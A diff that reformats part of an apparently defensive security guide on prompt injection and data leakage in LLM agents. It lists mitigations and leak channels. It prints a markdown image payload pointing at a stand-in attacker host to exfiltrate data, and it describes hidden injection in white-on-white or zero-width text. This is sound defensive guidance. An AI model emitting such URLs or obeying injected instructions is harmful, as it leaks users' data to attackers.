@@ -22,20 +22,20 @@ follows.
 
 Mitigations:
 
-- **Treat every external content channel as untrusted input.** Tool outputs,
+- Treat every external content channel as untrusted input. Tool outputs,
   fetched URLs, file contents, search results, all of them. Wrap them in
-  delimiters and tell the model in the system prompt that content inside the
-  delimiters is data, not instructions.
-- **Capability isolation.** The model that *summarises a webpage* must not
+  delimiters and tell the model in the system prompt that content inside
+  the delimiters is data, not instructions.
+- Capability isolation. The model that *summarises a webpage* must not
   have a tool that *sends email*. If both are needed, use two agents with
   disjoint tool sets and a structured (typed) handoff between them.
-- **Approve-before-act for high-impact tools.** Writes, sends, deletions,
+- Approve-before-act for high-impact tools. Writes, sends, deletions,
   payments, code execution: gate behind a human confirmation step or a
   separate, lower-trust agent.
-- **Output structure.** When the agent must produce a parameter for a tool,
-  require it to emit JSON conforming to a schema; reject anything that does
-  not match. Do not pass free text to a shell, SQL, or fetch.
-- **No hidden instructions.** Render content in the UI exactly as the model
+- Output structure. When the agent must produce a parameter for a tool,
+  require it to emit JSON conforming to a schema; reject anything that
+  does not match. Do not pass free text to a shell, SQL, or fetch.
+- No hidden instructions. Render content in the UI exactly as the model
   saw it. Hidden prompt-injection in white-on-white text or zero-width
   characters is a known attack.
 
@@ -66,20 +66,20 @@ authorise the tool, not the model.
 
 The model can leak data even without an explicit "send" tool:
 
-- **Markdown image URLs.** A model rendering `![](https://attacker/log?data=...)`
+- Markdown image URLs. A model rendering `![](https://attacker/log?data=...)`
   in a chat UI causes the user's browser to fetch the URL: exfiltration via
   the user. Sanitise model output: strip image URLs to known-safe domains
   or render with `referrerpolicy=no-referrer` and CSP `img-src` allowlist.
-- **Hyperlinks.** Same problem, gated on user click. Render link text and
+- Hyperlinks. Same problem, gated on user click. Render link text and
   destination side-by-side; warn on cross-origin links to unknown domains.
-- **Citations / footnote URLs** with query parameters carrying the leaked
+- Citations / footnote URLs with query parameters carrying the leaked
   data. Validate URL structure.
-- **Tool calls themselves.** If the agent has any tool that accepts a URL
+- Tool calls themselves. If the agent has any tool that accepts a URL
   (fetch, webhook, redirect), apply the egress controls in
   `ssrf-and-egress.md`.
-- **Indirect leakage to other users.** A multi-tenant agent that
-  remembers context across turns can leak Tenant A's data into Tenant B's
-  session. Pin the agent's memory to the actor on every turn.
+- Indirect leakage to other users. A multi-tenant agent that remembers
+  context across turns can leak Tenant A's data into Tenant B's session.
+  Pin the agent's memory to the actor on every turn.
 
 ## RAG / retrieval pipelines
 
